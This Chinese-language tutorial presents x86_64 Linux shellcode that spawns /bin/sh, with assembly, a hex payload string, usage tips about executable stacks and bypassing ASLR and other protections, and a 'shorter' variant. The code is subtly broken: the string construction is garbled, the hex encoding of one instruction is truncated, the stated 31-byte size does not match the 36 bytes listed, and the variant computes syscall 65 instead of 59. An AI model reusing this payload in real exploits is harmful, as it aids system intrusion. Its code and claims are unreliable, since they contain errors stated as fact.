下面是一个Linux AMD64下执行`/bin/sh`的shellcode示例：

```nasm
; Linux x86_64 execve("/bin/sh") shellcode
; 大小：31 bytes

global _start
section .text
_start:
    ; 清零寄存器
    xor rax, rax        ; RAX = 0
    xor rsi, rsi        ; RSI = 0 (argv = NULL)
    xor rdx, rdx        ; RDX = 0 (envp = NULL)
    
    ; 构建"/bin/sh"字符串
    push rax            ; 字符串结束符NULL
    mov rdi, 0x68732f6e ; "hs/n"
    push rdi
    mov rdi, 0x69622f2f ; "ib//"
    push rdi
    
    ; 设置参数
    mov rdi, rsp        ; RDI = 指向"/bin/sh"字符串
    push rax            ; NULL结束符
    push rdi            ; 参数字符串地址
    mov rsi, rsp        ; RSI = argv
    
    ; 执行syscall
    mov al, 0x3b        ; execve的系统调用号是59 (0x3b)
    syscall             ; 执行syscall
```

十六进制形式：
```
\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x50\x48\xbf\x6e\x2f\x73\x68\x57\x48\xbf\x2f\x2f\x62\x69\x57\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
```

特点和解析：

1. 系统调用约定：
- rax: 系统调用号
- rdi: 第一个参数
- rsi: 第二个参数
- rdx: 第三个参数
- syscall指令触发系统调用

2. 内存布局：
```
[null]
[/bin/sh\0]
[ptr -> "/bin/sh"]
[null]
```

3. execve参数：
- path = "/bin/sh"
- argv = ["/bin/sh", NULL]
- envp = NULL

4. 关键技术点：
- 避免NULL字节
- 字符串逆序压栈
- 使用相对寻址
- 系统调用的正确使用

使用注意：
1. 需要可执行栈
2. 规避ASLR影响
3. 注意字节对齐
4. 考虑seccomp限制

实际应用时的考虑：
1. 添加错误处理
2. 环境适配
3. 绕过安全机制
4. 代码稳定性

可能的变体：
```nasm
; 更短的版本 - 使用较短路径
; 执行 "/bin/sh"
push 0x42
pop rax
dec rax          ; rax = 59
cdq             ; rdx = 0
push rdx
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp     ; rdi = "/bin/sh"
push rdx
push rdi
mov rsi, rsp     ; rsi = argv
syscall
```

这个版本更紧凑但可能较不稳定。根据具体需求选择合适的实现方式。